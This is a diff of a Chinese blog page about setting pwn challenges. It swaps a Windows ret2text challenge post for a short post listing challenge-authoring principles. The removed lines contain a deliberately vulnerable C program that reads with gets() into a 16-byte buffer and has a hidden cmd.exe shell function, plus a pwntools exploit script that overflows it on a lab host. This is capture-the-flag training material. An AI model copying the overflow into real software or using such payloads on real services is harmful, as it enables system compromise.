@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>pwn-出题-win-ret2text | zt20xx</title>
+  <title>pwn-出题-序 | zt20xx</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;ctype.h&gt;#define DEFAULT_LEN 16void admin_shell(void)&#123;        system(&amp;q">
+  <meta name="description" content="1.不手动指定任何固定的地址2.在高版本下编译后依旧可以使用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn-出题-win-ret2text">
-<meta property="og:url" content="https://zt20xx.github.io/2024/10/19/pwn-%E5%87%BA%E9%A2%98-win-ret2text/index.html">
+<meta property="og:title" content="pwn-出题-序">
+<meta property="og:url" content="https://zt20xx.github.io/2024/10/18/pwn-user/pwn-%E5%87%BA%E9%A2%98-%E5%BA%8F/index.html">
 <meta property="og:site_name" content="zt20xx">
-<meta property="og:description" content="12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;ctype.h&gt;#define DEFAULT_LEN 16void admin_shell(void)&#123;        system(&amp;q">
+<meta property="og:description" content="1.不手动指定任何固定的地址2.在高版本下编译后依旧可以使用">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-19T11:28:05.000Z">
-<meta property="article:modified_time" content="2024-11-17T07:24:56.173Z">
+<meta property="article:published_time" content="2024-10-18T14:28:30.000Z">
+<meta property="article:modified_time" content="2024-12-04T13:38:32.618Z">
 <meta property="article:author" content="zt20xx">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -72,10 +72,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-pwn-出题-win-ret2text" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-pwn-user/pwn-出题-序" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/10/19/pwn-%E5%87%BA%E9%A2%98-win-ret2text/" class="article-date">
-  <time class="dt-published" datetime="2024-10-19T11:28:05.000Z" itemprop="datePublished">2024-10-19</time>
+    <a href="/2024/10/18/pwn-user/pwn-%E5%87%BA%E9%A2%98-%E5%BA%8F/" class="article-date">
+  <time class="dt-published" datetime="2024-10-18T14:28:30.000Z" itemprop="datePublished">2024-10-18</time>
 </a>
     
   </div>
@@ -86,7 +86,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      pwn-出题-win-ret2text
+      pwn-出题-序
     </h1>
   
 
@@ -94,15 +94,12 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">admin_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        system(<span class="string">&quot;C:\\Windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> buff[DEFAULT_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        gets(buff);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DEFAULT_LEN; i++) &#123;</span><br><span class="line">                buff[i] = <span class="built_in">toupper</span>(buff[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译<br><code>gcc -Wl,--disable-reloc -o ch72.exe ch72.c</code></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.190&quot;</span>,<span class="number">1234</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0x140001583</span>)<span class="comment">#ret_addr</span></span><br><span class="line">payload += p64(<span class="number">0x140001584</span>)<span class="comment">#admin_shell</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+        <p>1.不手动指定任何固定的地址<br>2.在高版本下编译后依旧可以使用</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/10/19/pwn-%E5%87%BA%E9%A2%98-win-ret2text/" data-id="cm3l9ut9l0009057o3z6h3hhv" data-title="pwn-出题-win-ret2text" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://zt20xx.github.io/2024/10/18/pwn-user/pwn-%E5%87%BA%E9%A2%98-%E5%BA%8F/" data-id="cm49xop2s000iou7oddis53qy" data-title="pwn-出题-序" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -114,19 +111,19 @@
     
 <nav id="article-nav">
   
-    <a href="/2024/10/19/pwn-%E5%87%BA%E9%A2%98-win-ret2dll/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2024/10/19/kernel/kernel-gdb%E8%B0%83%E8%AF%95-%E5%BA%8F/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">前一篇</strong>
       <div class="article-nav-title">
         
-          pwn-出题-win-ret2dll
+          kernel-gdb调试-序
         
       </div>
     </a>
   
   
-    <a href="/2024/10/19/pwn-%E5%87%BA%E9%A2%98-heap-base/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2024/10/16/pwn-user/pwn-%E5%87%BA%E9%A2%98-ret2libc/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">后一篇</strong>
-      <div class="article-nav-title">pwn-出题-heap-base</div>
+      <div class="article-nav-title">pwn-出题-ret2libc</div>
     </a>
   
 </nav>
